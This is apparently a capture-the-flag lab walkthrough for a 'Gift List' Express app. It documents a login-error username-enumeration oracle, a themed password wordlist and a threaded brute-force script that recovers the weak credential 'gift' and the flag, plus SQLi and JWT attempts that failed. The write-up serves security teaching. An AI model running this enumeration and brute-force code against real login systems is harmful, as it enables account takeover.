# gift-list-003 - BugForge Lab Walkthrough

**URL:** https://lab-1783787715109-me29pw.labs-app.bugforge.io/
**Difficulty:** Easy
**Vulnerability:** Weak/guessable password on a seeded account (broken authentication)
**Flag:** `bug{8s3FaO1Dl4agtIKkMXDcd8CaEGcKP2gP}`

---

## Summary

Gift List is a server-rendered Express/EJS gift-wishlist app with JWT (HttpOnly cookie) session auth. Registration and login use a plain username/password form, bcrypt-hashed server-side. The login endpoint leaks a username-enumeration oracle through distinct error query parameters. One seeded account, `jeremy` (user ID 1), has the trivially weak password `gift`, themed after the app's own name. Enumerating valid usernames and brute-forcing them against a small app-themed password wordlist found the credential quickly. Logging in as `jeremy` renders the flag directly on `/dashboard`.

## Tech Stack

- Node.js / Express, server-rendered EJS templates (`views/partials/header.ejs`, `footer.ejs`, etc.)
- Auth: username/password login, bcrypt password hashing, JWT (`HS256`) issued as an HttpOnly `token` cookie on successful login
- No client-side JS bundle or SPA framework - pure server-rendered forms, state changes are `POST` + redirect

## Key Endpoints

| Endpoint | Method | Auth | Notes |
|---|---|---|---|
| `/register` | GET/POST | none | `username`, `password`, `confirmPassword` |
| `/login` | GET/POST | none | Distinct redirect errors: `?error=invalidUser` (username does not exist) vs `?error=invalidPassword` (username exists, password wrong) - a user enumeration oracle |
| `/dashboard` | GET | session | Lists the logged-in user's own gift lists; the flag banner is rendered here for the vulnerable account |

## Attack Chain

### Step 1 - Discover the username-enumeration oracle

```bash
curl -s -X POST "$TARGET/login" -d "username=admin&password=x"          # -> ?error=invalidUser
curl -s -X POST "$TARGET/login" -d "username=administrator&password=x"  # -> ?error=invalidPassword (exists)
```

### Step 2 - Enumerate usernames

A threaded script swept a wordlist of common admin/service terms, first and last names, top real-world usernames, and app-theme words against the oracle, checking only for `invalidUser` vs `invalidPassword`:

```python
r = s.post(f"{TARGET}/login", data={"username": u, "password": "probe"}, allow_redirects=False)
if "invalidUser" not in r.headers.get("location", ""):
    print("VALID:", u)
```

This runs fast because bcrypt is never invoked for nonexistent usernames - only the DB lookup runs, and it fails immediately. Confirmed hits included `admin`, `administrator`, `test`, `carlos`, `jenny`, `jeremy`, and `kevin`.

### Step 3 - Build a themed password wordlist

Thirty base words drawn from the app's own vocabulary (`gift`, `giftlist`, `christmas`, `santa`, `wishlist`, `administrator`, `holiday`, `elf`, and similar) were expanded with case variants and common suffix/prefix patterns (years, `!`, `#1`, etc.), producing about 2,000 candidate passwords. This targeted list stands in for a full generic wordlist, which would be far too slow (see Dead Ends).

### Step 4 - Brute force the enumerated usernames, password-outer order

Requests against a valid username are much slower than requests against an invalid one, because bcrypt comparison appears to block the whole Express event loop - throughput stayed capped at a few requests per second regardless of thread count. Rather than exhausting one username's full password list before moving to the next, the queue was built password-outer, username-inner, so a weak password reused across any account would surface quickly:

```python
q = queue.Queue()
for pw in passwords:
    for u in usernames:
        q.put((u, pw))
```

A hit landed early in the list:

```bash
curl -s -X POST "$TARGET/login" -d "username=jeremy&password=gift" -D -
# -> HTTP 302, location: /dashboard  (no error redirect - success)
```

### Step 5 - Retrieve the flag

Logging in as `jeremy` renders the flag directly as a success banner on `/dashboard`:

```html
<div class="alert alert-success text-center" role="alert">
  <i class="bi bi-flag-fill fs-4"></i>
  <div class="mt-1"><strong>Flag captured!</strong></div>
  <code class="d-block mt-1">bug{8s3FaO1Dl4agtIKkMXDcd8CaEGcKP2gP}</code>
</div>
```

## Exploit

```python
import requests, threading, queue, time

TARGET = "https://lab-1783787715109-me29pw.labs-app.bugforge.io"

USERNAME_CANDIDATES = [
    "admin", "administrator", "root", "test", "guest", "support", "demo",
    "carlos", "jenny", "jeremy", "kevin", "owner", "staff",
    # extend with name lists / themed guesses as needed
]

BASE_WORDS = [
    "gift", "giftlist", "gift-list", "gift_list", "giftlab", "gift-lab",
    "christmas", "xmas", "santa", "santaclaus", "wishlist", "wish-list",
    "administrator", "admin", "gifting", "presents", "holiday", "holidays",
    "elf", "reindeer", "snowman", "winter", "festive", "sleigh", "chimney",
    "stocking", "mistletoe", "yuletide", "noel",
]
SUFFIXES = ["", "1", "123", "1234", "!", "2024", "2025", "2026"]


def enumerate_usernames():
    valid = []
    s = requests.Session()
    for u in USERNAME_CANDIDATES:
        r = s.post(f"{TARGET}/login", data={"username": u, "password": "probe"}, allow_redirects=False)
        if "invalidUser" not in r.headers.get("location", ""):
            valid.append(u)
    return valid


def build_passwords():
    out = set()
    for w in BASE_WORDS:
        for variant in {w, w.lower(), w.upper(), w.capitalize()}:
            for suf in SUFFIXES:
                out.add(variant + suf)
    return sorted(out)


def brute_force(usernames, passwords, threads=20):
    found = threading.Event()
    result = {}
    q = queue.Queue()
    for pw in passwords:
        for u in usernames:
            q.put((u, pw))

    def worker():
        s = requests.Session()
        while not found.is_set():
            try:
                u, pw = q.get_nowait()
            except queue.Empty:
                return
            r = s.post(f"{TARGET}/login", data={"username": u, "password": pw}, allow_redirects=False)
            loc = r.headers.get("location", "")
            if "invalidPassword" not in loc and "invalidUser" not in loc:
                result["username"], result["password"] = u, pw
                found.set()
                return

    pool = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
    for t in pool:
        t.start()
    while any(t.is_alive() for t in pool) and not found.is_set():
        time.sleep(1)
    return result


users = enumerate_usernames()
passwords = build_passwords()
cred = brute_force(users, passwords)
print("Credential:", cred)

s = requests.Session()
s.post(f"{TARGET}/login", data=cred, allow_redirects=False)
dash = s.get(f"{TARGET}/dashboard").text
import re
flag = re.search(r"bug\{[^}]+\}", dash)
print(flag.group(0) if flag else "flag not found on dashboard")
```

## Dead Ends

| Tried | Result | Lesson |
|---|---|---|
| JWT `alg:none` bypass on the `token` cookie | `jsonwebtoken`'s `verify()` rejects algorithm mismatches by default | Standard library defaults already close this off |
| JWT HMAC secret cracking (hashcat with rockyou, scraped-JWT-secrets list, and an app-themed custom list) | Not a weak or shared secret | The signing secret was strong even though the account password was not |
| SQLi (`' OR '1'='1`, comment bypass, `SLEEP()` timing) on the login `username`/`password` fields | Parameterized queries, no injection observed | Rule out fast and move on |
| Array/object type confusion on `password` (`password[]=a&password[]=b`) | Crashes the endpoint with a 500 (bcrypt throws on a non-string input), but does not bypass auth | The crash happens inside the bcrypt comparison step, after the user lookup, not before it |
| `Content-Type: application/json` on `/login` | No JSON body parser configured - `username` comes back undefined and the handler throws a 500 | The endpoint only accepts `application/x-www-form-urlencoded` |
| HTTP Basic Auth on protected routes | Not implemented - always redirects to `/login` | No legacy authentication fallback present |
| Full rockyou.txt brute force against `administrator` | Infeasible - server-side bcrypt throughput stayed around a few requests per second regardless of thread count, making a 14 million entry wordlist impractical | Pivot to a themed, targeted wordlist before reaching for a massive generic one against a bcrypt-gated endpoint |

## Root Cause

- A weak, guessable, app-themed password (`gift`) was set on a live seeded account, with no password strength policy enforced at registration.
- No login rate limiting or lockout exists; the only throttling observed was the incidental cost of bcrypt itself, not a deliberate control.
- Username enumeration through distinct error messages (`invalidUser` vs `invalidPassword`) makes targeted credential attacks straightforward once any password list is available.

## CWE / OWASP

- **CWE-521**: Weak Password Requirements
- **CWE-307**: Improper Restriction of Excessive Authentication Attempts
- **CWE-203**: Observable Discrepancy (username enumeration via differing error responses)
- **OWASP A07:2021** - Identification and Authentication Failures
